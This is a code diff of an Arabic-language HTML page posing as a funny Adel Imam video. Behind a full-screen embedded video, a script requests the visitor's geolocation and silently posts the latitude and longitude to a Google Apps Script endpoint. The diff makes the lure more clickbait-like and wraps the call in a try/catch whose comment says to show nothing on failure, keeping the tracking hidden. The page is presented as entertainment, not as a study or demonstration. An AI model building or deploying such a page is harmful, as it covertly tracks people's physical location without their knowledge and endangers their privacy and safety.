@@ -1,20 +1,24 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>🤣 شوف الفيديو ده</title>
+  <title>🤣 شوف الفيديو ده عادل امام ضحك موت</title>
   <style>
-    body {
+    body, html {
       margin: 0;
+      padding: 0;
       background: black;
       overflow: hidden;
+      height: 100%;
+      width: 100%;
     }
     iframe {
-      width: 100vw;
-      height: 100vh;
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
       border: none;
-      display: block;
     }
   </style>
 </head>
@@ -24,23 +28,25 @@
           allowfullscreen allow="autoplay; encrypted-media"></iframe>
 
   <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-
-      fetch("https://script.google.com/macros/s/AKfycbzL5Nys6NIEa27q5QPkcf0mMJ3U6YRr_ZBF1T7H3BLMBhI46VsbaS5xlv5DxYi2eCszcA/exec", {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lng
-        })
+    try {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("https://script.google.com/macros/s/AKfycbzL5Nys6NIEa27q5QPkcf0mMJ3U6YRr_ZBF1T7H3BLMBhI46VsbaS5xlv5DxYi2eCszcA/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        });
       });
-    });
+    } catch(e) {
+      // ما نعرضش أي حاجة حتى لو فشل
+    }
   </script>
 
 </body>
 </html>
+
